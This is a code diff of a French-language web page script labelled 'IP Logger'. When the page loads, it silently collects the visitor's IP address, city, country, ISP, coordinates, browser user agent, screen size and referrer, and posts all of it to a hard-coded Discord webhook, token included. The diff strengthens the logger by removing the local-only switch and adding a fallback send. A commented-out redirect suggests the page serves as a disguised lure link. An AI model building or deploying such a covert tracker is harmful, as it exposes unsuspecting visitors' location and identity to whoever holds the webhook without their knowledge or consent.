@@ -45,36 +45,54 @@
   </div>
 
   <script>
-    // === CONFIG ===
-    // Colle ton webhook Discord ici (crée un webhook dans un salon Discord)
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1545814857675178094/p3UgFMsHWFSDCENWP4_7fSixH0qjzHDfnTfGUuUgNdIxY2dsEzTEQeodxqXX1u-SACxR";
-    const SEND_TO_WEBHOOK = true;
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1573689278758780969/81L_PnH56AOSVgIBeucy4FQpueabbeDRw5hgoQPyCLzeGs8LgAo-xeali-JewGUDCTaf";
 
     async function getIP() {
       const endpoints = [
-        "https://api.ipify.org?format=json",
-        "https://ipapi.co/json/",
-        "https://api.ip.sb/geoip",
-        "https://ipinfo.io/json"
+        {
+          url: "https://api.ipify.org?format=json",
+          parse: d => ({ ip: d.ip })
+        },
+        {
+          url: "https://ipapi.co/json/",
+          parse: d => ({
+            ip: d.ip, city: d.city, region: d.region,
+            country: d.country_name, isp: d.org,
+            lat: d.latitude, lon: d.longitude, timezone: d.timezone
+          })
+        },
+        {
+          url: "https://ipinfo.io/json",
+          parse: d => ({
+            ip: d.ip, city: d.city, region: d.region,
+            country: d.country, isp: d.org,
+            timezone: d.timezone
+          })
+        },
+        {
+          url: "https://api.ip.sb/geoip",
+          parse: d => ({
+            ip: d.ip, city: d.city, region: d.region_name,
+            country: d.country, isp: d.isp,
+            lat: d.latitude, lon: d.longitude, timezone: d.timezone
+          })
+        }
       ];
-      for (const url of endpoints) {
+
+      let result = {};
+      for (const ep of endpoints) {
         try {
-          const res = await fetch(url, { cache: "no-store" });
+          const res = await fetch(ep.url, { cache: "no-store" });
           if (!res.ok) continue;
           const data = await res.json();
-          return {
-            ip: data.ip || data.query || null,
-            city: data.city || null,
-            region: data.region || data.regionName || null,
-            country: data.country_name || data.country || data.countryCode || null,
-            isp: data.org || data.isp || data.as || null,
-            lat: data.latitude || data.lat || null,
-            lon: data.longitude || data.lon || null,
-            timezone: data.timezone || null
-          };
+          const parsed = ep.parse(data);
+          for (const [k, v] of Object.entries(parsed)) {
+            if (v && !result[k]) result[k] = v;
+          }
+          if (result.ip && result.country) break;
         } catch (e) { continue; }
       }
-      return null;
+      return Object.keys(result).length ? result : null;
     }
 
     function collectClientInfo() {
@@ -82,56 +100,70 @@
         userAgent: navigator.userAgent,
         language: navigator.language,
         platform: navigator.platform,
-        screen: { width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio },
-        viewport: { width: window.innerWidth, height: window.innerHeight },
+        screen: `${screen.width}x${screen.height} @${window.devicePixelRatio}x`,
+        viewport: `${window.innerWidth}x${window.innerHeight}`,
         referrer: document.referrer || "direct",
         url: window.location.href,
         timestamp: new Date().toISOString()
       };
     }
 
-    async function sendLog(payload) {
-      if (!SEND_TO_WEBHOOK || !WEBHOOK_URL || WEBHOOK_URL.includes("REMPLACE")) {
-        console.log("[local] ", payload);
-        return;
-      }
-      const content = {
+    async function sendToDiscord(geo, client) {
+      const fields = [
+        { name: "🌐 IP",       value: geo?.ip       || "?", inline: true  },
+        { name: "🏳️ Pays",     value: geo?.country  || "?", inline: true  },
+        { name: "🏙️ Ville",    value: geo?.city     || "?", inline: true  },
+        { name: "📡 ISP",      value: geo?.isp      || "?", inline: false },
+        { name: "🕐 Heure",    value: client.timestamp,      inline: false },
+        { name: "🔗 URL",      value: client.url.slice(0, 200), inline: false },
+        { name: "↩️ Referrer", value: client.referrer,       inline: false },
+        { name: "💻 UA",       value: client.userAgent.slice(0, 200), inline: false },
+        { name: "🖥️ Écran",   value: client.screen,         inline: true  },
+        { name: "🗺️ Coords",  value: (geo?.lat && geo?.lon) ? `${geo.lat}, ${geo.lon}` : "?", inline: true }
+      ];
+
+      const body = JSON.stringify({
         embeds: [{
-          title: "Nouveau clic / IP log",
+          title: "🔔 Nouveau visiteur",
           color: 0x4ade80,
-          fields: [
-            { name: "IP", value: payload.ip || "?", inline: true },
-            { name: "Pays", value: payload.country || "?", inline: true },
-            { name: "Ville", value: payload.city || "?", inline: true },
-            { name: "ISP", value: payload.isp || "?", inline: false },
-            { name: "User-Agent", value: (payload.client.userAgent || "").slice(0, 200), inline: false },
-            { name: "Referrer", value: payload.client.referrer, inline: false },
-            { name: "Heure", value: payload.client.timestamp, inline: false }
-          ]
+          fields,
+          footer: { text: "IP Logger" },
+          timestamp: new Date().toISOString()
         }]
-      };
+      });
+
+      try {
+        const res = await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body
+        });
+        if (res.ok || res.status === 204) return true;
+      } catch (_) {}
+
       try {
         await fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(content),
+          body,
           mode: "no-cors"
         });
-      } catch (e) {}
+      } catch (_) {}
+
+      return false;
     }
 
     (async () => {
       const statusEl = document.getElementById("status");
-      const geo = await getIP();
-      const client = collectClientInfo();
-      const payload = { ...geo, client };
-      if (geo && geo.ip) {
-        statusEl.textContent = `IP: ${geo.ip}\n${geo.city || ""} ${geo.country || ""}`.trim();
-      } else {
-        statusEl.textContent = "Impossible de récupérer l'IP";
-      }
-      await sendLog(payload);
-      // setTimeout(() => { window.location.href = "https://google.com"; }, 1500); // optionnel redirect
+      const [geo, client] = await Promise.all([getIP(), Promise.resolve(collectClientInfo())]);
+
+      statusEl.textContent = geo?.ip
+        ? `IP: ${geo.ip}\n${[geo.city, geo.country].filter(Boolean).join(", ")}`
+        : "Impossible de récupérer l'IP";
+
+      await sendToDiscord(geo, client);
+
+      // setTimeout(() => { window.location.href = "https://google.com"; }, 1500);
     })();
   </script>
 </body>
